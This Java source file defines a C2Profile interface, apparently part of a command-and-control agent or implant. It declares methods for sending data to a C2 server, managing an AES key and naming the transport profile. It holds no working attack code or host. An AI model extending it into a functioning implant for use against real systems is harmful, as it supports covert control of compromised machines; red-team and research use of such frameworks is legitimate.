package com.woopsie.profiles;

import com.woopsie.Config;

/**
 * Interface for C2 communication profiles
 */
public interface C2Profile {
    
    /**
     * Send data to C2 server
     * @param data The data to send
     * @return Response from C2 server
     * @throws Exception if communication fails
     */
    String send(String data) throws Exception;
    
    /**
     * Get the AES key for encryption (if available)
     * @return AES key bytes, or null if not set
     */
    byte[] getAesKey();
    
    /**
     * Set the AES key for encryption
     * @param key AES key bytes
     */
    void setAesKey(byte[] key);
    
    /**
     * Get the profile name
     * @return Profile name (http, httpx, etc.)
     */
    String getProfileName();
}
